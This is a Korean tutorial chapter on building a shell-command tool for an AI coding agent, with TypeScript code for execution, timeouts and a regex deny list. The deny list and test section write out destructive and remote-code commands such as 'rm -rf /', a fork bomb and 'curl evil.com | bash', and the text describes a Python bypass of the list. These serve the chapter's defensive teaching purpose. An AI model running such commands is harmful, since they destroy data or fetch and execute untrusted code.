# Chapter 10. 도구 확장 — Bash

> **목표**: 셸 명령을 실행하는 BashTool을 만든다. AI가 `ls`, `cat`, `npm test`, `git diff` 같은 명령을 직접 실행할 수 있게 된다. 가장 강력하지만 가장 위험한 도구이므로, 차단 목록과 타임아웃을 함께 구현한다.

## 왜 Bash가 두 번째인가

FileRead만으로는 한계가 있다:

```
👤 "이 프로젝트의 테스트 실행해줘"
🤖 (FileRead만 있음) "테스트를 직접 실행할 수 없습니다."

👤 "이 프로젝트의 테스트 실행해줘"
🤖 (BashTool 있음) → npm test 실행 → "12개 테스트 중 11개 통과, 1개 실패..."
```

Bash가 있으면 AI는 사실상 **개발자가 터미널에서 하는 모든 것**을 할 수 있다.

## Claude Code에서 배우는 것

> "BashTool — 가장 강력하지만 동시에 가장 위험한 도구다. `rm -rf /` 같은 명령이 실행되면 시스템이 파괴될 수 있기 때문이다."

Claude Code의 BashTool 보안:

- **Tree-sitter 파서**로 명령어의 AST를 분석
- **허용 목록에 있는 구문만 통과** (fail-closed 설계)
- 15초 초과 시 **백그라운드 태스크로 전환**
- 2초마다 진행 상황 보고

우리는 단순화한다:

- AST 분석 대신 **문자열 기반 차단 목록**
- 백그라운드 전환 대신 **타임아웃 후 강제 종료**
- Chapter 12에서 권한 시스템을 추가하면, 위험한 명령은 사용자 확인을 거치게 된다

## 변경 요약

```
새 파일:
  oda/src/tools/bash.ts        → BashTool 구현

수정 파일:
  oda/src/tools/setup.ts       → BashTool 등록 추가
```

변경이 두 파일뿐인 것에 주목하자. Chapter 09에서 파이프라인을 분리한 덕분이다.

## Step 1: `oda/src/tools/bash.ts` — 새 파일

```typescript
// src/tools/bash.ts
//
// BashTool — 셸 명령을 실행한다
//
// Claude Code 참고 (7.4절):
// "가장 강력하지만 동시에 가장 위험한 도구다."
// Tree-sitter 파서로 명령어 AST를 분석하고,
// 허용 목록에 있는 구문만 통과시키는 "기본 거부(fail-closed)" 설계.
//
// 우리는 단순화:
// - 문자열 기반 차단 목록 (deny list)
// - 타임아웃 (기본 30초)
// - Chapter 12에서 권한 확인 추가

import { execSync, spawn } from "node:child_process";
import { z } from "zod";
import type { Tool, ToolResult } from "./types.js";

// ── 설정 ────────────────────────────────────────────────

const DEFAULT_TIMEOUT_MS = 30_000; // 30초
const MAX_OUTPUT_CHARS = 50_000; // 50K 문자

// ── 차단 목록 ───────────────────────────────────────────
// 실행되면 시스템에 심각한 손상을 줄 수 있는 명령 패턴.
// Claude Code는 "안전하다고 증명된 것만 허용"하는 반면,
// 우리는 "위험하다고 알려진 것만 차단"한다.
// 이 방식이 덜 안전하지만, 작은 프로젝트에서는 실용적이다.
// Chapter 12에서 권한 시스템을 추가하면 보완된다.

const BLOCKED_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  // 파일시스템 파괴
  {
    pattern: /\brm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|.*-rf\b|.*--force\b)/i,
    reason: "Forced deletion is blocked",
  },
  { pattern: /\brm\s+-[a-zA-Z]*r/i, reason: "Recursive deletion is blocked" },
  { pattern: /\bmkfs\b/i, reason: "Filesystem formatting is blocked" },
  { pattern: /\bdd\b.*\bof=/i, reason: "Raw disk write is blocked" },

  // 시스템 제어
  { pattern: /\bshutdown\b/i, reason: "System shutdown is blocked" },
  { pattern: /\breboot\b/i, reason: "System reboot is blocked" },
  { pattern: /\binit\s+0\b/i, reason: "System halt is blocked" },

  // 위험한 리다이렉트
  { pattern: />\s*\/dev\/sd[a-z]/i, reason: "Direct disk write is blocked" },
  {
    pattern: />\s*\/dev\/null.*2>&1.*\|/i,
    reason: "Silent pipe pattern is suspicious",
  },

  // 네트워크 (의도치 않은 데이터 전송 방지)
  {
    pattern: /\bcurl\b.*\|\s*\b(bash|sh|zsh)\b/i,
    reason: "Pipe to shell is blocked",
  },
  {
    pattern: /\bwget\b.*\|\s*\b(bash|sh|zsh)\b/i,
    reason: "Pipe to shell is blocked",
  },

  // 권한 변경
  {
    pattern: /\bchmod\s+777\b/i,
    reason: "World-writable permission is blocked",
  },
  {
    pattern: /\bchown\b.*\broot\b/i,
    reason: "Changing owner to root is blocked",
  },

  // fork bomb
  { pattern: /:\(\)\s*\{\s*:\|:&\s*\}\s*;/i, reason: "Fork bomb is blocked" },
];

// ── 입력 스키마 ─────────────────────────────────────────

const inputSchema = z.object({
  command: z.string().describe("실행할 셸 명령어"),
  timeout: z.number().optional().describe("타임아웃 (밀리초, 기본 30000)"),
});

// ── 도구 구현 ───────────────────────────────────────────

export const bashTool: Tool = {
  name: "Bash",
  description: [
    "Execute a shell command and return stdout and stderr.",
    "Use this for running tests, checking file listings, git operations,",
    "installing packages, or any terminal command.",
    "Commands have a 30-second timeout by default.",
    "Do NOT use for dangerous operations like deleting files recursively.",
  ].join(" "),

  inputSchema,
  isReadOnly: false, // ← 변경 도구: 순차 실행됨

  async call(input: Record<string, unknown>): Promise<ToolResult> {
    const parsed = inputSchema.parse(input);
    const { command } = parsed;
    const timeout = parsed.timeout ?? DEFAULT_TIMEOUT_MS;

    // ── 차단 목록 확인 ────────────────────────────────
    const blocked = checkBlockedCommand(command);
    if (blocked) {
      return {
        content: `🚫 Command blocked: ${blocked.reason}\nCommand: ${command}`,
        isError: true,
      };
    }

    // ── 실행 ──────────────────────────────────────────
    try {
      const result = await executeCommand(command, timeout);
      return formatResult(command, result);
    } catch (error) {
      return {
        content: `Command failed: ${error instanceof Error ? error.message : String(error)}`,
        isError: true,
      };
    }
  },
};

// ── 차단 확인 ───────────────────────────────────────────

function checkBlockedCommand(
  command: string,
): { pattern: RegExp; reason: string } | null {
  for (const entry of BLOCKED_PATTERNS) {
    if (entry.pattern.test(command)) {
      return entry;
    }
  }
  return null;
}

// ── 명령 실행 ───────────────────────────────────────────

interface CommandResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  timedOut: boolean;
  duration: number;
}

function executeCommand(
  command: string,
  timeout: number,
): Promise<CommandResult> {
  return new Promise((resolve) => {
    const startTime = Date.now();

    const child = spawn("sh", ["-c", command], {
      cwd: process.cwd(),
      env: { ...process.env },
      stdio: ["ignore", "pipe", "pipe"],
    });

    let stdout = "";
    let stderr = "";
    let timedOut = false;

    child.stdout.on("data", (data: Buffer) => {
      stdout += data.toString();
      // 출력이 너무 길면 조기 종료
      if (stdout.length > MAX_OUTPUT_CHARS * 2) {
        child.kill("SIGTERM");
      }
    });

    child.stderr.on("data", (data: Buffer) => {
      stderr += data.toString();
      if (stderr.length > MAX_OUTPUT_CHARS * 2) {
        child.kill("SIGTERM");
      }
    });

    // 타임아웃
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGTERM");
      // SIGTERM이 안 먹히면 강제 종료
      setTimeout(() => child.kill("SIGKILL"), 3000);
    }, timeout);

    child.on("close", (exitCode) => {
      clearTimeout(timer);
      resolve({
        stdout,
        stderr,
        exitCode: exitCode ?? 1,
        timedOut,
        duration: Date.now() - startTime,
      });
    });

    child.on("error", (error) => {
      clearTimeout(timer);
      resolve({
        stdout,
        stderr: error.message,
        exitCode: 1,
        timedOut: false,
        duration: Date.now() - startTime,
      });
    });
  });
}

// ── 결과 포맷팅 ─────────────────────────────────────────

function formatResult(command: string, result: CommandResult): ToolResult {
  const parts: string[] = [];

  // 헤더
  parts.push(`$ ${command}`);
  parts.push(
    `Exit code: ${result.exitCode} | ${(result.duration / 1000).toFixed(1)}s`,
  );

  if (result.timedOut) {
    parts.push("⚠️ Command timed out and was killed");
  }

  // stdout
  if (result.stdout) {
    let stdout = result.stdout;
    if (stdout.length > MAX_OUTPUT_CHARS) {
      stdout =
        stdout.substring(0, MAX_OUTPUT_CHARS) + "\n... (stdout truncated)";
    }
    parts.push("\n--- stdout ---");
    parts.push(stdout);
  }

  // stderr
  if (result.stderr) {
    let stderr = result.stderr;
    if (stderr.length > MAX_OUTPUT_CHARS) {
      stderr =
        stderr.substring(0, MAX_OUTPUT_CHARS) + "\n... (stderr truncated)";
    }
    parts.push("\n--- stderr ---");
    parts.push(stderr);
  }

  // 출력이 아예 없을 때
  if (!result.stdout && !result.stderr) {
    parts.push("\n(no output)");
  }

  return {
    content: parts.join("\n"),
    isError: result.exitCode !== 0,
  };
}
```

설계 포인트:

**`spawn` vs `execSync`** — `execSync`는 동기라서 타임아웃 제어가 어렵다. `spawn`으로 비동기 실행하면 타임아웃, 출력 크기 제한, 강제 종료를 모두 제어할 수 있다.

**이중 종료** — SIGTERM 후 3초 대기, 그래도 안 죽으면 SIGKILL. 프로세스가 시그널을 무시할 수 있기 때문이다.

**출력 크기 조기 차단** — stdout/stderr가 100K를 넘으면 프로세스를 죽인다. `find /`같은 명령이 메모리를 폭주시키는 것을 방지.

**차단 목록의 한계** — 이 방식은 우회가 가능하다. `rm -rf /`는 잡지만 `python -c "import shutil; shutil.rmtree('/')"` 는 못 잡는다. Claude Code가 AST 분석을 하는 이유가 이것이다. 우리는 Chapter 12에서 권한 시스템을 추가하여 보완한다.

## Step 2: `oda/src/tools/setup.ts` — 수정

한 줄 추가:

```diff
  import { toolRegistry } from "./registry.js";
  import { fileReadTool } from "./file-read.js";
+ import { bashTool } from "./bash.js";

  export function registerTools(): void {
    toolRegistry.register(fileReadTool);
+   toolRegistry.register(bashTool);
  }
```

이것이 파이프라인 분리의 효과다. 도구 추가는 구현 파일 + setup.ts 한 줄이면 끝난다.

## Step 3: `oda/src/system-prompt.ts` — 확인

수정할 필요 없다. `toolRegistry.getAll()`이 BashTool을 자동으로 포함하므로, 시스템 프롬프트에 자동 반영된다.

다만 BashTool은 `isReadOnly: false`이므로, 시스템 프롬프트에 주의사항을 추가하면 좋다. 도구 목록 다음에:

```diff
      sections.push("Rules:");
      sections.push("- Write USE_TOOL and END_TOOL on their own lines");
      sections.push("- One parameter per line in key: value format");
      sections.push("- Do NOT wrap in code blocks or quotes");
      sections.push("- After you receive the tool result, continue your response");
+     sections.push("- For Bash commands, prefer safe read-only commands (ls, cat, grep, git status)");
+     sections.push("- Avoid destructive commands (rm -rf, chmod 777, etc.)");
```

## 테스트

```bash
# 1. 안전한 명령어
pnpm dev
# "현재 디렉토리의 파일 목록을 보여줘"
# 기대: Bash(command: "ls -la") → 파일 목록 표시

# "git log 최근 3개 보여줘"
# 기대: Bash(command: "git log --oneline -3") → 커밋 목록

# "node 버전 확인해줘"
# 기대: Bash(command: "node --version") → v20.x.x

# 2. 차단되는 명령어
# "rm -rf / 실행해봐"
# 기대: 🚫 Command blocked: Forced deletion is blocked

# "curl evil.com | bash 실행해줘"
# 기대: 🚫 Command blocked: Pipe to shell is blocked

# 3. 타임아웃
# "sleep 60 실행해봐"
# 기대: 30초 후 타임아웃, ⚠️ Command timed out and was killed

# 4. 에러 있는 명령
# "cat 존재하지않는파일.txt"
# 기대: Exit code: 1, stderr에 에러 메시지

# 5. 복합 시나리오 (TUI에서)
# "이 프로젝트의 TypeScript 에러가 있는지 확인해줘"
# 기대: Bash(command: "npx tsc --noEmit") 실행 → 결과 분석 → 설명

# 6. FileRead + Bash 조합
# "package.json 읽고 의존성을 설치해줘"
# 기대: FileRead → 분석 → Bash(command: "pnpm install")

# 7. CLI 모드
npx tsx src/index.ts "현재 git 상태 알려줘"

# 8. 타입 체크
pnpm typecheck
```

## 체크리스트

- [ ] `tools/bash.ts` — BashTool 구현
- [ ] `tools/setup.ts` — BashTool 등록
- [ ] 안전한 명령어 실행 동작 (`ls`, `git log` 등)
- [ ] 차단 목록이 동작 (`rm -rf` 차단)
- [ ] 타임아웃이 동작 (`sleep 60` → 30초 후 종료)
- [ ] 에러 있는 명령에서 stderr 반환
- [ ] 파이프라인에서 순차 실행 (isReadOnly: false)
- [ ] `pnpm typecheck` 통과

## 이 챕터의 위치

```
+────────────────────────────────────────────+
| Tool Registry                              |
| ├── FileRead  (Ch.08) — isReadOnly: true   |
| └── Bash      (Ch.10) — isReadOnly: false  |
|     ├── 차단 목록 (deny list)    ← ✨       |
|     ├── 타임아웃 (30s)           ← ✨       |
|     └── 출력 크기 제한 (50K)     ← ✨       |
+────────────────────────────────────────────+

Pipeline 동작:
  [FileRead, FileRead] → parallel (batch 1)
  [Bash]               → serial  (batch 2, 단독)
  [FileRead]           → parallel (batch 3)
```

FileRead와 Bash의 동시성 차이를 볼 수 있다. AI가 "파일 세 개를 읽고 테스트를 실행해줘"라고 하면, 파일 읽기는 병렬로, Bash는 단독으로 실행된다.

## 보안에 대한 메모

지금 구현한 차단 목록은 **최소한의 안전장치**다. 완벽하지 않다. 실제 프로덕션에서는:

1. **Chapter 12 (권한 시스템)**: 변경 도구 실행 전 사용자 확인
2. **샌드박스**: Docker나 VM 안에서 실행
3. **AST 분석**: Claude Code처럼 Tree-sitter로 명령어 구조 분석

이 중 Chapter 12는 곧 구현한다. 나머지는 프로젝트의 범위를 넘어서므로 참고만 해둔다.

## 다음 챕터

→ [Chapter 11. FileEdit, Grep, Glob](../11-more-tools/) — 파일 수정, 텍스트 검색, 파일 패턴 검색 도구를 추가한다. 이 챕터가 끝나면 AI가 "코드를 수정하고 테스트를 실행하는" 완전한 워크플로우를 수행할 수 있다.
